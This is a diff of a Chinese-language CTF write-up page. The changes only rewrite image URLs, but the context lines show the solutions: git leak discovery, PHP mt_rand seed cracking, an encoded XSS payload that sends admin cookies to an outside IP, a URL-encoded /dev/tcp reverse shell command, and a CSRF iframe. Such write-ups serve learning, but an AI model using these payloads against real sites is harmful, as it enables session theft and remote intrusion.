@@ -63,21 +63,18 @@ NULL</p>
 <p>扫目录发现有<code>.DS_Store</code>文件，发现<code>http://ctf1.linkedbyx.com:10122/e10adc3949ba59abbe56e057f20f883e</code>目录下有 git 泄露</p>
 <p>拿到文件之后有个压缩包，尝试明文攻击得到 hint.txt</p>
 <p><figure>
-<a href=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610002411.jpg>
-<img src=https://cdn.jsdelivr.net/gh/ZeddYu/ZeddYu.github.io@master/https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610002411.jpg loading=lazy>
+<a href=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610002411.jpg><img src=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610002411.jpg loading=lazy>
 </a>
 </figure></p>
 <p>拿到 code 为 9faedd5999937171912159d28b219d86，访问<code>flag/seed.txt</code>发现回显 NAVIE</p>
 <p>在首页输入 code 参数与 name 参数，回显了另一个 code</p>
 <p><figure>
-<a href=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610003120.jpg>
-<img src=https://cdn.jsdelivr.net/gh/ZeddYu/ZeddYu.github.io@master/https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610003120.jpg loading=lazy>
+<a href=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610003120.jpg><img src=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610003120.jpg loading=lazy>
 </a>
 </figure></p>
 <p>综合前面给出的<code>flag/seed.txt</code>，猜测是个随机数的问题，应该是要猜解随机数问题，用<a class=link href=https://github.com/lepiaf/php_mt_seed target=_blank rel=noopener>php_mt_seed</a>这个工具直接爆破可以得到 seed</p>
 <p><figure>
-<a href=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610005612.jpg>
-<img src=https://cdn.jsdelivr.net/gh/ZeddYu/ZeddYu.github.io@master/https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610005612.jpg loading=lazy>
+<a href=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610005612.jpg><img src=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610005612.jpg loading=lazy>
 </a>
 </figure></p>
 <p>访问<code>flag/209228.txt</code>拿到 flag</p>
@@ -90,8 +87,7 @@ NULL</p>
 <h3 id=hacking-1>Hacking</h3>
 <p>随便用一个用户名进去。</p>
 <p><figure>
-<a href=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610000476.jpg>
-<img src=https://cdn.jsdelivr.net/gh/ZeddYu/ZeddYu.github.io@master/https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610000476.jpg loading=lazy>
+<a href=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610000476.jpg><img src=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610000476.jpg loading=lazy>
 </a>
 </figure></p>
 <p>有一个留言功能，可以进行留言，有一个 report 功能，可以报告一个 url 给管理员，还有一个执行命令与清空留言的功能。所以很明显的一个利用思路就是留言处进行 xss ，把留言界面的 url 发送给管理员，拿到 cookie 即可进行命令执行</p>
@@ -104,8 +100,7 @@ NULL</p>
 <div class=highlight><pre tabindex=0 class=chroma><code class=language-html data-lang=html><span class=p>&lt;/</span><span class=nt>li</span><span class=p>&gt;&lt;</span><span class=nt>iframe</span> <span class=na>src</span><span class=o>=</span><span class=s>&#34;&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;:window.location=&#39;http://106.14.153.173:8080/?&#39;+encodeURI(document.cookie)&#34;</span><span class=p>&gt;&lt;/</span><span class=nt>iframe</span><span class=p>&gt;&lt;</span><span class=nt>li</span><span class=p>&gt;</span>
 </code></pre></div><p>然后我们只需要把<code>http://ctf2.linkedbyx.com:10611/main.php</code>在 report 界面提交就好了。</p>
 <p><figure>
-<a href=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610009186.jpg>
-<img src=https://cdn.jsdelivr.net/gh/ZeddYu/ZeddYu.github.io@master/https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610009186.jpg loading=lazy>
+<a href=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610009186.jpg><img src=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610009186.jpg loading=lazy>
 </a>
 </figure></p>
 <p>成功拿到 cookie ，这时候我们只需要带着 cookie 去执行命令就好了</p>
@@ -125,8 +120,7 @@ NULL</p>
 command=bash%20-c%20%22sh%20%3E%26%20%2Fdev%2Ftcp%2Fyour_ip%2Fport%200%3E%261%22%20&amp;exec=1
 </code></pre></div><p>这里我直接弹了 shell ，在根目录下发现 flag.txt</p>
 <p><figure>
-<a href=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610000205.jpg>
-<img src=https://cdn.jsdelivr.net/gh/ZeddYu/ZeddYu.github.io@master/https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610000205.jpg loading=lazy>
+<a href=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610000205.jpg><img src=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610000205.jpg loading=lazy>
 </a>
 </figure></p>
 <p>其实如果拿不到 cookie 的话，也可以用以下方式去构造一个 CSRF</p>
@@ -137,8 +131,7 @@ command=bash%20-c%20%22sh%20%3E%26%20%2Fdev%2Ftcp%2Fyour_ip%2Fport%200%3E%261%22
 <span class=p>&lt;</span><span class=nt>iframe</span> <span class=na>src</span><span class=o>=</span><span class=s>&#34;&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;:parent.document.getElementById(&#39;myform&#39;).submit();&#34;</span><span class=p>&gt;&lt;/</span><span class=nt>iframe</span><span class=p>&gt;</span>
 </code></pre></div><p>事实证明也确实可以这么去做。</p>
 <p><figure>
-<a href=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610001833.jpg>
-<img src=https://cdn.jsdelivr.net/gh/ZeddYu/ZeddYu.github.io@master/https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610001833.jpg loading=lazy>
+<a href=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610001833.jpg><img src=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610001833.jpg loading=lazy>
 </a>
 </figure></p>
 <p>waf 黑名单如下：</p>
